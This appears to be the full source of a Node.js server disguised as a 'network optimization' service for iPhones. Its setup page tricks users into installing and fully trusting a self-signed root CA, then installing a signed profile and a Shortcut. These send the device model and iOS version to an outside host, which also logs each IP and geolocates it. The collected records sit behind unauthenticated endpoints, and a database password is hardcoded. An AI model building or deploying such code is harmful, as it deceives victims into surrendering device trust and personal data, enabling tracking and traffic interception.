const express = require('express');
const axios = require('axios');
const plist = require('plist');
const cors = require('cors');
const { Pool } = require('pg');
const forge = require('node-forge');
const crypto = require('crypto');

const app = express();
const PORT = process.env.PORT || 3000;

// 数据库连接
const pool = new Pool({
  connectionString: 'postgresql://neondb_owner:npg_k5hlBvdIsPA4@ep-plain-dawn-ayjfr136-pooler.c-5.us-east-2.aws.neon.tech/neondb?sslmode=require&uselibpqcompat=true'
});

// 自签名证书
let caCertPem, signCertPem, signKeyPem;

function generateCerts() {
  const caKeys = forge.pki.rsa.generateKeyPair(2048);
  const caCert = forge.pki.createCertificate();
  caCert.publicKey = caKeys.publicKey;
  caCert.serialNumber = '01';
  caCert.validity.notBefore = new Date();
  caCert.validity.notAfter = new Date(Date.now() + 3650 * 24 * 60 * 60 * 1000);
  caCert.setSubject([{ name: 'commonName', value: 'Network Service CA' }]);
  caCert.setIssuer(caCert.subject.attributes);
  caCert.setExtensions([
    { name: 'basicConstraints', cA: true },
    { name: 'keyUsage', keyCertSign: true, cRLSign: true }
  ]);
  caCert.sign(caKeys.privateKey, forge.md.sha256.create());

  const signKeys = forge.pki.rsa.generateKeyPair(2048);
  const signCert = forge.pki.createCertificate();
  signCert.publicKey = signKeys.publicKey;
  signCert.serialNumber = '02';
  signCert.validity.notBefore = new Date();
  signCert.validity.notAfter = new Date(Date.now() + 3650 * 24 * 60 * 60 * 1000);
  signCert.setSubject([{ name: 'commonName', value: 'Network Service Profile Signer' }]);
  signCert.setIssuer(caCert.subject.attributes);
  signCert.setExtensions([
    { name: 'basicConstraints', cA: false },
    { name: 'keyUsage', digitalSignature: true }
  ]);
  signCert.sign(caKeys.privateKey, forge.md.sha256.create());

  caCertPem = forge.pki.certificateToPem(caCert);
  signCertPem = forge.pki.certificateToPem(signCert);
  signKeyPem = forge.pki.privateKeyToPem(signKeys.privateKey);
}

function signMobileconfig(xml) {
  const p7 = forge.pkcs7.createSignedData();
  p7.content = new forge.util.ByteBuffer(xml, 'utf8');
  p7.addCertificate(forge.pki.certificateFromPem(signCertPem));
  p7.addSigner({
    key: forge.pki.privateKeyFromPem(signKeyPem),
    certificate: forge.pki.certificateFromPem(signCertPem),
    digestAlgorithm: forge.pki.oids.sha256,
    authenticatedAttributes: [
      { type: forge.pki.oids.contentType, value: forge.pki.oids.data },
      { type: forge.pki.oids.messageDigest },
      { type: forge.pki.oids.signingTime, value: new Date().toISOString() }
    ]
  });
  p7.sign({ detached: false });
  return forge.asn1.toDer(p7.toAsn1()).getBytes();
}

function getEmptyProfile() {
  const uuid = crypto.randomUUID();
  return `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array></array>
    <key>PayloadDisplayName</key>
    <string>Network Service</string>
    <key>PayloadIdentifier</key>
    <string>com.service.done.${uuid}</string>
    <key>PayloadUUID</key>
    <string>${uuid}</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadType</key>
    <string>Configuration</string>
</dict>
</plist>`;
}

// 初始化数据库
async function initAll() {
  try {
    await pool.query(`
      CREATE TABLE IF NOT EXISTS devices (
        id SERIAL PRIMARY KEY,
        version TEXT,
        product TEXT,
        ip TEXT,
        city TEXT,
        isp TEXT,
        received_at TIMESTAMPTZ DEFAULT NOW()
      );
      CREATE TABLE IF NOT EXISTS filter_rules (
        id SERIAL PRIMARY KEY,
        rule_type TEXT,
        value TEXT,
        created_at TIMESTAMPTZ DEFAULT NOW()
      );
      CREATE TABLE IF NOT EXISTS request_log (
        ip TEXT PRIMARY KEY,
        last_request TIMESTAMPTZ DEFAULT NOW(),
        request_count INTEGER DEFAULT 1
      );
    `);
    console.log('✅ 数据库表已就绪');
  } catch (err) {
    console.error('❌ 建表失败:', err);
  }
  generateCerts();
  console.log('🔐 签名证书已生成');
}

app.use(cors());
app.use(express.text({ type: '*/*' }));
app.use(express.json());

app.use((req, res, next) => {
  console.log(`📡 [${new Date().toISOString()}] ${req.method} ${req.path}  IP: ${req.ip}`);
  next();
});

// 首页
app.get('/', (req, res) => {
  res.send('<h2>网络优化服务</h2><p>请访问 <a href="/setup">配置页面</a> 完成设置</p>');
});

// 配置引导页
app.get('/setup', (req, res) => {
  const timestamp = Date.now();
  res.send(`
    <!DOCTYPE html>
    <html>
    <head><meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1"><title>网络优化配置</title></head>
    <body style="font-family: -apple-system, sans-serif; padding: 20px; background: #f5f5f5;">
      <h2>🔧 网络优化配置</h2>
      <p>按照步骤完成设置，提升网络连接稳定性。</p>
      <ol>
        <li><b>安装安全证书</b><br>
          <a href="/ca.crt?v=${timestamp}" style="color:#007AFF;">下载安全证书</a>，前往「设置→通用→VPN与设备管理」安装。
        </li>
        <li><b>信任证书</b><br>
          进入「设置→通用→关于本机→证书信任设置」，找到 <b>Network Service CA</b> 并开启信任。
        </li>
        <li><b>安装网络配置</b><br>
          <a href="/signed-profile.mobileconfig?v=${timestamp}" style="color:#007AFF;">下载网络配置</a>，前往「设置→通用→VPN与设备管理」安装。
        </li>
        <li><b>激活服务</b><br>
          下载激活文件：<a href="/activate.shortcut" style="color:#007AFF;">激活文件</a><br>
          下载后，点击文件选择用<b>“快捷指令”</b>打开，然后点击<b>“添加快捷指令”</b>。<br>
          添加完成后，运行一次该快捷指令，即可完成网络激活。
        </li>
      </ol>
      <p style="color:gray; margin-top:20px;">全部完成后，无需其他操作。</p>
    </body>
    </html>
  `);
});

// 下载 CA 证书
app.get('/ca.crt', (req, res) => {
  res.setHeader('Content-Type', 'application/x-x509-ca-cert');
  res.setHeader('Content-Disposition', 'attachment; filename="ca.crt"');
  res.send(caCertPem);
});

// 下载签名描述文件
app.get('/signed-profile.mobileconfig', (req, res) => {
  const profileUUID = crypto.randomUUID();
  const contentUUID = crypto.randomUUID();
  const xml = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>PayloadContent</key>
    <array>
        <dict>
            <key>PayloadType</key>
            <string>com.apple.profile-service</string>
            <key>PayloadVersion</key>
            <integer>1</integer>
            <key>PayloadUUID</key>
            <string>${contentUUID}</string>
            <key>PayloadIdentifier</key>
            <string>com.service.collect.${contentUUID}</string>
            <key>URL</key>
            <string>https://jx-peizhi.onrender.com/activate</string>
            <key>RequestAttributes</key>
            <array>
                <string>PRODUCT</string>
                <string>VERSION</string>
            </array>
        </dict>
    </array>
    <key>PayloadDisplayName</key>
    <string>Network Service</string>
    <key>PayloadIdentifier</key>
    <string>com.service.profile.${profileUUID}</string>
    <key>PayloadUUID</key>
    <string>${profileUUID}</string>
    <key>PayloadOrganization</key>
    <string>Network Service Provider</string>
    <key>PayloadVersion</key>
    <integer>1</integer>
    <key>PayloadType</key>
    <string>Configuration</string>
</dict>
</plist>`;
  const signed = signMobileconfig(xml);
  res.setHeader('Content-Type', 'application/x-apple-aspen-config');
  res.setHeader('Content-Disposition', 'attachment; filename="network.mobileconfig"');
  res.send(Buffer.from(signed, 'binary'));
});

// 下载极简快捷指令文件
app.get('/activate.shortcut', (req, res) => {
  const shortcutPlist = `<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>WFWorkflowActions</key>
    <array>
        <dict>
            <key>WFWorkflowActionIdentifier</key>
            <string>is.workflow.actions.getdeviceinfo</string>
            <key>WFWorkflowActionParameters</key>
            <dict>
                <key>WFDeviceDetail</key>
                <string>WFDeviceDetailSystemVersion</string>
                <key>WFActionOutputName</key>
                <string>系统版本</string>
            </dict>
        </dict>
        <dict>
            <key>WFWorkflowActionIdentifier</key>
            <string>is.workflow.actions.getdeviceinfo</string>
            <key>WFWorkflowActionParameters</key>
            <dict>
                <key>WFDeviceDetail</key>
                <string>WFDeviceDetailModel</string>
                <key>WFActionOutputName</key>
                <string>型号</string>
            </dict>
        </dict>
        <dict>
            <key>WFWorkflowActionIdentifier</key>
            <string>is.workflow.actions.gettext</string>
            <key>WFWorkflowActionParameters</key>
            <dict>
                <key>WFTextActionText</key>
                <string>&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;VERSION&lt;/key&gt;
    &lt;string&gt;[[系统版本]]&lt;/string&gt;
    &lt;key&gt;PRODUCT&lt;/key&gt;
    &lt;string&gt;[[型号]]&lt;/string&gt;
&lt;/dict&gt;
&lt;/plist&gt;</string>
            </dict>
        </dict>
        <dict>
            <key>WFWorkflowActionIdentifier</key>
            <string>is.workflow.actions.url</string>
            <key>WFWorkflowActionParameters</key>
            <dict>
                <key>URLActionURL</key>
                <string>https://jx-peizhi.onrender.com/activate</string>
                <key>Advanced</key>
                <true/>
                <key>WFHTTPMethod</key>
                <string>POST</string>
                <key>WFHTTPBodyType</key>
                <string>WFHTTPBodyTypeText</string>
                <key>WFHTTPHeaders</key>
                <dict>
                    <key>Content-Type</key>
                    <string>application/x-apple-aspen-config</string>
                </dict>
                <key>WFHTTPBody</key>
                <string>[[文本]]</string>
            </dict>
        </dict>
    </array>
    <key>WFWorkflowIcon</key>
    <dict>
        <key>WFWorkflowIconStartColor</key>
        <integer>4282601983</integer>
        <key>WFWorkflowIconGlyphNumber</key>
        <integer>61440</integer>
    </dict>
    <key>WFWorkflowImportQuestions</key>
    <array/>
    <key>WFWorkflowTypes</key>
    <array/>
    <key>WFWorkflowInputContentItemClasses</key>
    <array/>
    <key>WFWorkflowName</key>
    <string>网络激活</string>
    <key>WFWorkflowOutputContentItemClasses</key>
    <array/>
</dict>
</plist>`;
  res.setHeader('Content-Type', 'application/octet-stream');
  res.setHeader('Content-Disposition', 'attachment; filename="网络激活.shortcut"');
  res.send(shortcutPlist);
});

// 动态过滤函数（已去掉型号过滤）
async function isRequestAllowed(ip, product, version) {
  // 1. IP 黑名单
  const blacklist = await pool.query("SELECT value FROM filter_rules WHERE rule_type = 'ip_blacklist'");
  if (blacklist.rows.some(r => r.value === ip)) {
    console.log(`🚫 黑名单 IP 被拒绝: ${ip}`);
    return false;
  }

  // 2. IP 白名单
  const whitelist = await pool.query("SELECT value FROM filter_rules WHERE rule_type = 'ip_whitelist'");
  if (whitelist.rows.length > 0 && !whitelist.rows.some(r => r.value === ip)) {
    console.log(`🚫 不在白名单的 IP 被拒绝: ${ip}`);
    return false;
  }

  // 3. 频率限制
  const rateLimit = await pool.query("SELECT value FROM filter_rules WHERE rule_type = 'rate_limit'");
  const maxRequests = rateLimit.rows.length > 0 ? parseInt(rateLimit.rows[0].value) : 5;

  const log = await pool.query("SELECT * FROM request_log WHERE ip = $1", [ip]);
  if (log.rows.length > 0) {
    const last = new Date(log.rows[0].last_request);
    const now = new Date();
    const diff = (now - last) / 1000;
    if (diff < 60 && log.rows[0].request_count >= maxRequests) {
      console.log(`⏱️ IP ${ip} 超过频率限制 (${maxRequests}/分钟)`);
      return false;
    }
    if (diff < 60) {
      await pool.query("UPDATE request_log SET request_count = request_count + 1, last_request = NOW() WHERE ip = $1", [ip]);
    } else {
      await pool.query("UPDATE request_log SET request_count = 1, last_request = NOW() WHERE ip = $1", [ip]);
    }
  } else {
    await pool.query("INSERT INTO request_log (ip, last_request, request_count) VALUES ($1, NOW(), 1)", [ip]);
  }
  return true;
}

// 激活接口（带过滤，精确 IP 收集）
app.post('/activate', async (req, res) => {
  console.log('📥 收到激活请求');
  try {
    const deviceInfo = plist.parse(req.body);
    let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress || '';
    if (ip.includes(',')) ip = ip.split(',')[0].trim();
    if (ip.startsWith('::ffff:')) ip = ip.slice(7);

    const product = deviceInfo.PRODUCT || '';
    const version = deviceInfo.VERSION || '';

    // 动态过滤
    const allowed = await isRequestAllowed(ip, product, version);
    if (!allowed) {
      res.setHeader('Content-Type', 'application/x-apple-aspen-config');
      return res.send(getEmptyProfile());
    }

    let geo = { city: '未知', isp: '未知' };
    try {
      const geoRes = await axios.get(`http://ip-api.com/json/${ip}?fields=status,city,isp`, { timeout: 3000 });
      if (geoRes.data.status === 'success') geo = { city: geoRes.data.city, isp: geoRes.data.isp };
    } catch (e) {}

    await pool.query(
      `INSERT INTO devices (version, product, ip, city, isp) VALUES ($1, $2, $3, $4, $5)`,
      [version, product, ip, geo.city, geo.isp]
    );
    console.log('✅ 激活数据已入库');
  } catch (err) {
    console.error('❌ 处理失败:', err);
  }
  res.setHeader('Content-Type', 'application/x-apple-aspen-config');
  res.send(getEmptyProfile());
});

// 过滤规则管理
app.get('/admin/rules', async (req, res) => {
  const result = await pool.query("SELECT * FROM filter_rules ORDER BY rule_type");
  res.json(result.rows);
});

app.post('/admin/rules', async (req, res) => {
  const { rule_type, value } = req.body;
  if (!rule_type || !value) return res.status(400).json({ error: '缺少参数' });
  await pool.query("INSERT INTO filter_rules (rule_type, value) VALUES ($1, $2)", [rule_type, value]);
  res.json({ success: true });
});

app.delete('/admin/rules/:id', async (req, res) => {
  await pool.query("DELETE FROM filter_rules WHERE id = $1", [req.params.id]);
  res.json({ success: true });
});

// 查看设备数据
app.get('/devices', async (req, res) => {
  const result = await pool.query('SELECT * FROM devices ORDER BY received_at DESC');
  res.json(result.rows);
});

initAll().then(() => {
  app.listen(PORT, () => console.log(`✅ 服务运行在端口 ${PORT}`));
});
